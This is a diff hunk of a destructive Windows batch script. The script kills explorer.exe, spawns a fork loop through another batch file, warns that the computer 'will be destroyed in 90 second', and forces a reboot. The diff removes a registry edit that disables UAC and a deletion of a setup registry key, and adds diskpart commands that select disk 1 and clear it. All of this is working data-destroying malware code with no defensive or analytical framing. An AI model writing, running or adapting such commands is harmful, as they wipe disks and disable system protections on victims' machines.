@@ -26,8 +26,9 @@ taskkill /im explorer.exe
 start love2.bat
 goto fork
 echo Your computer will be destroyed in 90 second
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
 timeout 90
-REG DELETE Computer\HKEY_LOCAL_MACHINE\SYSTEM\Setup\SetupType /f
+diskpart
+select disk 1
+clear
 shutdown /r /t 1
 
